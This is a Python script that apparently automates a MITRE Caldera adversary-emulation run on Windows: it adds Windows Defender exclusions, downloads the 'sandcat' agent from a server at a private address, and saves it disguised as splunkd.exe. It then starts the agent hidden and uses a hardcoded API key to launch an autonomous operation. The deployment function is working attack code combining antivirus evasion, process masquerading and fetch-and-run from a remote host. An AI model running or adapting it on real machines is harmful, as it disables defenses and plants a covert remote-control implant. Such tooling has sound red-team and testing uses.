import subprocess
from pathlib import Path
import requests
import json
from typing import Optional, Union

EXCLUDE_PATH = r"C:\Users\Public"

SERVER = "http://192.168.2.13:8888"
API_KEY = "fkCN5-fGrXaAUQvFBAC-llG6g1ufglBNV-RcAQh6oow"
HEADERS = {"KEY": API_KEY, "Content-Type": "application/json"}
GROUP = "red"

def run_powershell(cmd: str):
    full_cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd]
    proc = subprocess.run(full_cmd, capture_output=True, text=True)
    return proc

def add_exclusion(path: str):
    check_cmd = f"$p = (Get-MpPreference).ExclusionPath; " \
                f"if ($p -and $p -contains '{path}') {{ Write-Output 'EXISTS' }} " \
                f"else {{ Add-MpPreference -ExclusionPath '{path}'; Write-Output 'ADDED' }}"
    return run_powershell(check_cmd)

def add_file_exclusion(file_path: str):
    check_cmd = f"$f = (Get-MpPreference).ExclusionPath; " \
                f"if ($f -and $f -contains '{file_path}') {{ Write-Output 'EXISTS' }} " \
                f"else {{ Add-MpPreference -ExclusionPath '{file_path}'; Write-Output 'ADDED' }}"
    return run_powershell(check_cmd)

def deploy_agent():
    # Folder exclusion
    print("Excluding folder...")
    p = str(Path(EXCLUDE_PATH).resolve())
    res = add_exclusion(p)
    print("Folder exclusion result:", res.stdout.strip())

    # File exclusion for the agent
    agent_file = "C:/Users/Public/splunkd.exe"  # use forward slashes to avoid unicodeescape
    res_file = add_file_exclusion(agent_file)
    print("File exclusion result:", res_file.stdout.strip())

    print("Deploying agent...")
    # Use forward slashes in paths inside PowerShell command
    ps_command = f"""
    $server="{SERVER}";
    $url="$server/file/download";
    $wc=New-Object System.Net.WebClient;
    $wc.Headers.add("platform","windows");
    $wc.Headers.add("file","sandcat.go");
    $data=$wc.DownloadData($url);
    Get-Process | ? {{$_.modules.filename -like "C:/Users/Public/splunkd.exe"}} | Stop-Process -Force;
    Remove-Item "C:/Users/Public/splunkd.exe" -Force -ErrorAction Ignore;
    [IO.File]::WriteAllBytes("C:/Users/Public/splunkd.exe",$data) | Out-Null;
    Start-Process -FilePath C:/Users/Public/splunkd.exe -ArgumentList "-server $server -group {GROUP}" -WindowStyle Hidden;
    """

    proc = run_powershell(ps_command)

    if proc.returncode != 0:
        print("Error executing PowerShell command:")
        print(proc.stderr)
    else:
        print("PowerShell command executed successfully.")
        print(proc.stdout)


def call_api(payload: dict, method: str = "POST"):
    """
    Generic helper for /api/rest.
    method: 'POST' or 'PUT' (Caldera uses PUT for create operations)
    """
    url = f"{SERVER}/api/rest"
    if method.upper() == "POST":
        r = requests.post(url, headers=HEADERS, json=payload, timeout=30)
    elif method.upper() == "PUT":
        r = requests.put(url, headers=HEADERS, json=payload, timeout=30)
    else:
        raise ValueError("Unsupported method")
    try:
        r.raise_for_status()
    except requests.HTTPError as e:
        print(f"[ERROR] HTTP {r.status_code}: {r.text}")
        raise
    try:
        return r.json()
    except ValueError:
        return r.text

def list_adversaries() -> list:
    resp = call_api({"index": "adversaries"}, method="POST")
    if not isinstance(resp, list):
        # older/newer Caldera versions may nest results; attempt to extract
        if isinstance(resp, dict) and "data" in resp and isinstance(resp["data"], list):
            return resp["data"]
        # fallback: try to coerce single object into list
        return [resp]
    return resp

def get_adversary_identifier(adv_obj: dict) -> Optional[str]:
    """Return the field that likely contains the adversary id."""
    return adv_obj.get("id") or adv_obj.get("adversary_id") or adv_obj.get("uuid") or adv_obj.get("_id")

def choose_adversary(adversaries: list) -> Optional[dict]:
    if not adversaries:
        print("No adversaries returned from server.")
        return None

    print("\nAvailable adversaries:")
    for idx, a in enumerate(adversaries, start=1):
        name = a.get("name") or a.get("display_name") or "<unnamed>"
        adv_id = get_adversary_identifier(a) or "unknown-id"
        print(f" {idx}. {name}  (id: {adv_id})")

    # loop until valid selection
    while True:
        try:
            choice = input(f"\nEnter number to select adversary [1-{len(adversaries)}] (or press Enter to pick 1): ").strip()
            if choice == "":
                idx = 1
            else:
                idx = int(choice)
            if 1 <= idx <= len(adversaries):
                selected = adversaries[idx - 1]
                print(f"Selected: {selected.get('name') or selected.get('display_name')}")
                return selected
            else:
                print("Number out of range, try again.")
        except ValueError:
            print("Invalid input, enter a number (e.g. 1) or press Enter to accept 1.")

def create_operation(name: str, group: str, adversary_id: Optional[str] = None,
                     planner: str = "batch", autonomous: int = 1) -> dict:
    payload = {
        "index": "operations",
        "name": name,
        "group": group,
        "planner": planner,
        "autonomous": autonomous
    }
    if adversary_id:
        payload["adversary_id"] = adversary_id
    return call_api(payload, method="PUT")

def find_created_operation_id(create_resp: Union[dict, list], op_name: str) -> Optional[str]:
    if isinstance(create_resp, list) and create_resp:
        return create_resp[0].get("id")
    elif isinstance(create_resp, dict):
        return create_resp.get("id")
    return None


def set_operation_state(op_id: str, state: str = "running") -> dict:
    """
    Change the operation state. op_id is passed as string (UUID or numeric).
    """
    payload = {"index": "operation", "op_id": op_id, "state": state}
    return call_api(payload, method="POST")

if __name__ == "__main__":
    deploy_agent()
    try:
        adversaries = list_adversaries()
    except Exception as e:
        print("Failed to fetch adversaries:", e)
        raise

    selected = choose_adversary(adversaries)
    if not selected:
        raise SystemExit("No adversary selected; exiting.")

    adversary_id = get_adversary_identifier(selected)
    if not adversary_id:
        print("Warning: selected adversary has no obvious id field. Attempting to proceed anyway.")

    op_name = input("Enter a name for the operation (or press Enter to use 'automated-operation-1'): ").strip() or "automated-operation-1"

    print(f"\nCreating operation '{op_name}' targeting group '{GROUP}' with adversary id '{adversary_id}'...")
    create_resp = create_operation(op_name, GROUP, adversary_id=adversary_id)
    print("Create response (raw):", json.dumps(create_resp, indent=2))

    op_id = find_created_operation_id(create_resp, op_name)
    if not op_id:
        raise RuntimeError("Unable to determine created operation id. Inspect server response above.")

    print(f"Operation created with id: {op_id}. Starting it now...")
    start_resp = set_operation_state(op_id, state="running")
    print("Operation should now be running against agents in group:", GROUP)